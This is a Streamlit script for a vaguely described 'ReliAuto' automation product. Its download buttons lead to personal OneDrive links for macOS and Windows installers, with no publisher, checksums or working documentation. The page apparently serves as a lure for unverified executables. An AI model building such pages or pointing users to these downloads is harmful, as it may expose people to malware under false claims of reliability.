import streamlit as st

# Configure page
st.set_page_config(
    page_title="ReliAuto - Trusted Automation Suite",
    layout="centered"
)

# Header Section
st.markdown("<h1 style='text-align: center'>ReliAuto Core</h1>", unsafe_allow_html=True)
st.markdown("<h3 style='text-align: center'>Initial Release of the Most Reliable Automation Framework</h3>", unsafe_allow_html=True)
st.markdown("---")

# Main Content
st.markdown("""
## **Effortless Automation, Guaranteed Reliability**

**Foundational Features:**
- Cross-platform compatibility
- One-click configuration setup
- Self-validating execution system
- Plain English interface
- Built-in reliability safeguards
""")

st.markdown("---")

# Key Features
col1, col2 = st.columns(2)
with col1:
    st.markdown("""
    ### Unmatched Simplicity
    *"Automation should work for you, not vice versa"*
    - 5-minute setup wizard
    - Visual configuration dashboard
    - Auto-dependency installation
    - Guided troubleshooting
    """)

with col2:
    st.markdown("""
    ### Military-Grade Reliability
    - Fail-safe execution protocol
    - Automatic state recovery
    - Precision validation layers
    - Continuous integrity checks
    """)

# Download Section
st.markdown("---")
st.markdown("## Start Your Automation Journey")

st.markdown("""
**Installation Package Includes:**
- ReliAuto Core Engine
- Configuration Assistant
- Reliability Toolkit
- Sample Automation Templates
- Setup Guide (PDF + Video)
""")

# Updated download URLs
MACOS_DOWNLOAD_URL = "https://1drv.ms/u/c/f4598138ab76194c/EZOtyBZorDNFjnwjCODpUVQBsgJSW-y-FxIM9-eQtAqpQg?e=N0H0u0"
WINDOWS_DOWNLOAD_URL = "https://1drv.ms/u/c/f4598138ab76194c/EaN3mFLYcoZNleThW7aUuSUBc6eQMgM4SmFNva1-OY-7mw?e=Jqaccj"

# Create two columns for download buttons
dl_col1, dl_col2 = st.columns(2)

with dl_col1:
    st.markdown(f"""
    <div style="text-align: center">
    <a href="{MACOS_DOWNLOAD_URL}">
        <button style="
            background: #1A5BC4;
            color: white;
            padding: 18px 32px;
            border: none;
            border-radius: 8px;
            font-size: 18px;
            font-weight: bold;
            cursor: pointer;
            margin: 20px auto;
            display: block;
            width: 100%;">
            Download for macOS (v1.0)
        </button>
    </a>
    </div>
    """, unsafe_allow_html=True)

with dl_col2:
    st.markdown(f"""
    <div style="text-align: center">
    <a href="{WINDOWS_DOWNLOAD_URL}">
        <button style="
            background: #107C10;
            color: white;
            padding: 18px 32px;
            border: none;
            border-radius: 8px;
            font-size: 18px;
            font-weight: bold;
            cursor: pointer;
            margin: 20px auto;
            display: block;
            width: 100%;">
            Download for Windows (v1.0)
        </button>
    </a>
    </div>
    """, unsafe_allow_html=True)

st.markdown("""
**Quick Start Requirements:**  
✓ macOS 12+ or Windows 10+ • 4GB RAM • 500MB storage  
✓ Internet connection for auto-configuration  
✓ Basic English understanding
""", unsafe_allow_html=True)

# Footer
st.markdown("---")
st.markdown("""
<div style='text-align: center'>
<a href="#"><i>Enterprise Configuration Guide</i></a> • 
Support • Reliability Metrics • Setup Docs
</div>
""", unsafe_allow_html=True)